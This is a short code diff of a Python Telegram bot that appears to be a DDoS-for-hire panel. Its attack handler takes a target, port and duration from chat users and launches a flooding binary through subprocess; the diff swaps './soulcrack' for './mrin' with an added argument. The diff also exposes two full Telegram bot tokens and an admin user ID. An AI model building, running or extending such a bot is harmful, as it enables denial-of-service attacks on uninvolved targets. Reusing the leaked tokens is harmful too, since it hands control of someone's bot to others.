@@ -8,7 +8,7 @@ from keep_alive import keep_alive
 keep_alive()
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7404886490:AAFi-vrRY5R156j8zKJUSl2dxQiZ6rgYQwg')
+bot = telebot.TeleBot('7404886490:AAEybvV4lTt2Tg_uN0nau4tGqgx4C6XlIgY')
 
 # Admin user IDs
 admin_id = {"1163610781"}
@@ -314,7 +314,7 @@ def handle_attack(message):
                     log_command(user_id, target, port, time_in_seconds)
 
                     # Start the attack
-                    full_command = f"./soulcrack {target} {port} {time_in_seconds}"
+                    full_command = f"./mrin {target} {port} {time_in_seconds} 1200"
                     subprocess.Popen(full_command, shell=True)
 
                     # Schedule "Attack Ended" message
